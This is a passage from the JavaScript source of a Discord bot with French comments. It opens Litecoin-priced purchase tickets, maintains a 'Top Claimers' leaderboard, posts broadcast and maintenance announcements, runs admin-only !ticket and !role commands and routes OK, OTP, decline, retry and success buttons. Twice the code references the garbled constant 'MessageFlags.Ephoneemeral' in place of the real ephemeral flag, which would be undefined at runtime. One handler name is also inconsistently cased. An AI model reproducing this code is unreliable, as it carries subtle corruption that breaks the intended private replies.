  return TICKET_PLANS.find((p) => p.key === key) ?? null;
}

// PlanSelect.callback
export async function handlePlanSelect(interaction) {
  const plan = planByKey(interaction.values[0]);
  if (!plan) {
    return interaction.reply({ content: "Invalid plan.", flags: MessageFlags.Ephoneemeral });
  }

  // création du salon + appel CoinGecko : on accuse réception d'abord
  await interaction.deferReply({ flags: MessageFlags.Ephoneemeral });
  const channel = await openTicket(interaction, TICKET_PURCHASE_CATEGORY_ID, "purchase");
  if (!channel) return;

  // montant en LTC (valeur de repli si l'API est indisponible)
  const ltc = await usdToLtc(plan.usd);
  const ltcStr = ltc !== null ? `${ltc} LTC` : "Ask staff (rate unavailable)";

  await channel.send(buildInvoiceView(plan.label, plan.usd, ltcStr));
  await interaction.editReply({
    content: `\u2705 Purchase ticket opened: <#${channel.id}>`,
  });
}

// ---------- Leaderboard, broadcast, maintenance ----------
function makeEmbed({ title, description, color, footer }) {
  const embed = new EmbedBuilder();
  if (title) embed.setTitle(title);
  if (description) embed.setDescription(description);
  if (color != null) embed.setColor(color);
  if (footer) embed.setFooter({ text: footer });
  return embed;
}

// Publie ou met à jour le message de classement. Retourne { ok, message }.
export async function refreshLeaderboard() {
  if (!state.bot || state.status !== "online") {
    return { ok: false, message: "offline" };
  }
  const cfg = await getConfig();
  const chId = (cfg.leaderboard_channel_id ?? "").trim();
  if (!chId) return { ok: false, message: "no channel" };

  const top = await state.db
    .collection("presser_stats")
    .find({}, { projection: { _id: 0 } })
    .sort({ ok_count: -1 })
    .limit(15)
    .toArray();

  let lines;
  if (!top.length) {
    lines = "_No claims yet._";
  } else {
    const medals = ["🥇", "🥈", "🥉"];
    lines = top
      .map(
        (r, i) =>
          `${medals[i] ?? "🔸"} **${i + 1}.** <@${r.discord_id}> — **${r.ok_count}** OKs`
      )
      .join("\n");
  }

  const embed = makeEmbed({
    // titre vide en config -> titre par défaut (en Python, un titre "" restait vide)
    title: cfg.leaderboard_title || "🏆 Top Claimers",
    description: `${cfg.leaderboard_desc ?? ""}\n\n${lines}`,
    color: cfg.leaderboard_color ?? 0xfacc15,
    footer: (cfg.footer_text ?? "").trim(),
  });

  try {
    const ch = await getChannel(chId);
    const msgId = (cfg.leaderboard_message_id ?? "").trim();
    if (msgId) {
      try {
        const msg = await ch.messages.fetch(msgId);
        await msg.edit({ embeds: [embed] });
        return { ok: true, message: "edited" };
      } catch {
        /* message supprimé : on en recrée un */
      }
    }
    const created = await ch.send({ embeds: [embed] });
    await saveConfig({ leaderboard_message_id: created.id });
    return { ok: true, message: "posted" };
  } catch (e) {
    log.warn(`leaderboard: ${e}`);
    return { ok: false, message: String(e) };
  }
}

// Envoie l'embed défini par l'admin dans le salon de broadcast
export async function sendBroadcast(override = null) {
  if (!state.bot || state.status !== "online") {
    return { ok: false, message: "offline" };
  }
  let cfg = await getConfig();
  if (override) cfg = { ...cfg, ...override };
  const chId = (cfg.broadcast_channel_id ?? "").trim();
  if (!chId) return { ok: false, message: "no channel" };
  try {
    const ch = await getChannel(chId);
    const embed = makeEmbed({
      title: cfg.broadcast_title ?? "Announcement",
      description: cfg.broadcast_desc ?? "",
      color: cfg.broadcast_color ?? 0xfacc15,
      footer: (cfg.footer_text ?? "").trim(),
    });
    await ch.send({ embeds: [embed] });
    return { ok: true, message: "sent" };
  } catch (e) {
    return { ok: false, message: String(e) };
  }
}

// Annonce le début / la fin de la maintenance dans le salon de broadcast
export async function announceMaintenance(enabled) {
  if (!state.bot || state.status !== "online") {
    return { ok: false, message: "offline" };
  }
  const cfg = await getConfig();
  const chId = (cfg.broadcast_channel_id ?? "").trim();
  if (!chId) return { ok: false, message: "no broadcast channel" };
  try {
    const ch = await getChannel(chId);
    const footer = (cfg.footer_text ?? "").trim();
    const embed = enabled
      ? makeEmbed({
          title: cfg.maintenance_title ?? "🛠 Maintenance in progress",
          description:
            cfg.maintenance_desc ?? "The bot is temporarily down for maintenance.",
          color: 0xef4444,
          footer,
        })
      : makeEmbed({
          title: cfg.back_online_title ?? "✅ We're back",
          description: cfg.back_online_desc ?? "Everything is operational again.",
          color: 0x22c55e,
          footer,
        });
    await ch.send({ embeds: [embed] });
    return { ok: true, message: "sent" };
  } catch (e) {
    log.warn(`announce_maintenance: ${e}`);
    return { ok: false, message: String(e) };
  }
}

// ---------- Commandes à préfixe : !ticket, !role ----------
// Préfixes comme en Python : mention du bot, "!snap" ou "!"
function stripPrefix(content, botId) {
  for (const p of [`<@${botId}>`, `<@!${botId}>`, "!snap", "!"]) {
    if (content.startsWith(p)) return content.slice(p.length).trimStart();
  }
  return null;
}

function parseMentionId(token, kind) {
  if (!token) return null;
  const m = kind === "role" ? token.match(/^<@&(\d+)>$/) : token.match(/^<@!?(\d+)>$/);
  if (m) return m[1];
  return /^\d{15,25}$/.test(token) ? token : null;
}

async function resolveMemberArg(guild, token) {
  const id = parseMentionId(token, "user");
  return id ? guild.members.fetch(id).catch(() => null) : null;
}

async function resolveRoleArg(guild, token) {
  const id = parseMentionId(token, "role");
  return id ? guild.roles.fetch(id).catch(() => null) : null;
}

function registerMessageCommands(client) {
  client.on("messageCreate", async (message) => {
    try {
      if (message.author.bot || !message.guild) return;
      const rest = stripPrefix(message.content, client.user.id);
      if (rest === null) return;
      const [cmd, ...args] = rest.split(/\s+/).filter(Boolean);
      const perms = message.member?.permissions;

      if (cmd === "ticket") {
        // Régénère le panel de tickets dans le salon configuré (admin uniquement)
        if (!perms?.has(PermissionFlagsBits.Administrator)) return;
        const ch = await message.guild.channels
          .fetch(TICKET_PANEL_CHANNEL_ID)
          .catch(() => null);
        if (!ch) {
          await message.channel.send("\u274C Ticket panel channel not found.");
          return;
        }
        // supprime les anciens panels récents du bot
        try {
          const recent = await ch.messages.fetch({ limit: 20 });
          for (const m of recent.values()) {
            if (m.author.id === client.user.id) await m.delete();
          }
        } catch {
          /* ignoré */
        }
        try {
          await ch.send(buildTicketPanelView());
          await message.delete().catch(() => {});
        } catch (e) {
          await message.channel.send(`\u274C Failed to post panel: ${e.message ?? e}`);
        }
      } else if (cmd === "role") {
        // Bascule un rôle sur un membre (admin uniquement) : !role @user @role
        if (!perms?.has(PermissionFlagsBits.Administrator)) return;
        const member = await resolveMemberArg(message.guild, args[0]);
        const role = await resolveRoleArg(message.guild, args[1]);
        if (!member || !role) {
          await message.channel.send("Usage: `!role @user @role`");
          return;
        }
        try {
          if (member.roles.cache.has(role.id)) {
            await member.roles.remove(role, `!role by ${message.author.username}`);
            await message.channel.send(`\u2705 Removed <@&${role.id}> from <@${member.id}>`);
          } else {
            await member.roles.add(role, `!role by ${message.author.username}`);
            await message.channel.send(`\u2705 Added <@&${role.id}> to <@${member.id}>`);
          }
        } catch (e) {
          if (e.code === 50013) {
            await message.channel.send(
              "\u274C I can't manage that role (check my role is above it and I have Manage Roles)."
            );
          } else {
            await message.channel.send(`\u274C Error: ${e.message ?? e}`);
          }
        }
      }
    } catch (e) {
      log.warn(`message command error: ${e}`);
    }
  });
}

// ---------- Routage des interactions ----------
// Boutons et menus à customId fixe (persistants : rien à réenregistrer au redémarrage,
// donc plus besoin de bot.add_view)
const STATIC_BUTTONS = new Map([
  ["snapplus:close_ticket", handleCloseTicketButton],
]);

const STATIC_SELECTS = new Map([
  ["snapplus:ticket_category", handleTicketCategorySelect],
  ["snapplus:plan_select", handlePlanSelect],
]);

function registerInteractionHandler(client) {
  client.on("interactionCreate", async (interaction) => {
    try {
      if (interaction.isButton()) {
        const id = interaction.customId;
        const fixed = STATIC_BUTTONS.get(id);
        if (fixed) return await fixed(interaction);

        // boutons dont le customId porte l'id de l'utilisateur : action:<id>
        const sep = id.indexOf(":");
        const action = sep === -1 ? id : id.slice(0, sep);
        const userId = sep === -1 ? "" : id.slice(sep + 1);
        if (action === "snap_ok") await handleOkButton(interaction, userId);
        else if (action === "snap_otp") await handleotpButton(interaction, userId);
        else if (action === "snap_decline") await handleDeclineButton(interaction, userId);
        else if (action === "snap_retry") await handleRetryButton(interaction, userId);
        else if (action === "snap_success") await handleSuccessButton(interaction, userId);
        return;
      }

      if (interaction.isStringSelectMenu()) {
        const handler = STATIC_SELECTS.get(interaction.customId);
        if (handler) await handler(interaction);
        return;
      }

      if (
        interaction.isModalSubmit() &&
        interaction.customId.startsWith("snap_decline_modal:")
      ) {
        const userId = interaction.customId.slice("snap_decline_modal:".length);
        await handleDeclineModal(interaction, userId);
      }
    } catch (err) {
      log.error("interaction error:", err);
    }
  });
}

// ---------- Cycle de vie du bot ----------
async function buildAndStart(token, intents) {
  const client = new Client({ intents });

  // "clientReady" : discord.js 14.22+ (sur les versions plus anciennes, utiliser "ready")
  client.once("clientReady", () => {
    state.status = "online";
    state.lastError = null;
    log.info(`[snap-bot] online as ${client.user.tag}`);
  });

  client.on("error", (err) => {
    state.status = "error";
    state.lastError = String(err);
    log.error("[snap-bot] client error:", err);
  });

  registerInteractionHandler(client);
  registerMessageCommands(client);

  state.bot = client;
  try {
    await client.login(token);
  } catch (err) {
    try {
      await client.destroy();
    } catch {
      /* ignoré */
    }
    state.bot = null;
    throw err;
  }
}

async function runBot(token) {
  // MessageContent (privilégié) n'est nécessaire que pour les commandes à préfixe (!ticket, !role)
  const base = [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages];
  try {
    await buildAndStart(token, [...base, GatewayIntentBits.MessageContent]);
  } catch (err) {
    if (err?.code === "DisallowedIntents") {
      // Reessaie sans message_content : les commandes à préfixe ne marcheront pas
      log.warn(
        "[snap-bot] Message Content Intent désactivé dans le Developer Portal : !ticket et !role ne fonctionneront pas"
      );
      try {
        await buildAndStart(token, base);
      } catch (e) {
        state.status = "error";
        state.lastError = String(e);
        log.error(e);
      }
    } else if (err?.code === "TokenInvalid") {
      state.status = "error";
      state.lastError = "Invalid bot token";
    } else {
      state.status = "error";
      state.lastError = String(err);
      log.error(err);
    }
  }
}

// Retourne { ok, message } (en Python : un tuple (bool, str))
export async function startBot() {
  try {
    if (!state.db) await connectDb();
    const cfg = await getConfig();
    const token = (cfg.token || process.env.DISCORD_TOKEN || "").trim();
    if (!token) return { ok: false, message: "No token configured" };
    if (state.status === "online" || state.status === "starting") {
      return { ok: false, message: `Bot already ${state.status}` };
    }
    state.status = "starting";
    state.lastError = null;
    state.task = runBot(token); // sans attendre (create_task)
    return { ok: true, message: "starting" };
  } catch (err) {
    state.status = "error";
    state.lastError = String(err);
    log.error(err);
    return { ok: false, message: String(err) };
  }
}

export async function stopBot() {
  if (state.bot) {
    try {
      await state.bot.destroy();
    } catch (e) {
      log.warn(`close failed: ${e}`);
    }
  }
  state.bot = null;
  state.task = null;
  state.status = "stopped";
  return true;
}

export function status() {
  const b = state.bot;
  return {
    status: state.status,
    last_error: state.lastError,
    bot_user: b?.user?.tag ?? null,
    guilds: b ? b.guilds.cache.size : 0,
  };
}

export function setDb(db) {
  state.db = db;
}

// ---------- Point d'entrée (désactivé : server.js pilote le cycle de vie) ----------
// Si tu utilises bot.js seul (sans server.js), décommente ces lignes :
//
// startBot().then((r) => log.info(`startBot: ${r.message}`));
//
// process.on("SIGINT", async () => {
//   await stopBot();
//   await state.mongo?.close();
//   process.exit(0);
// });
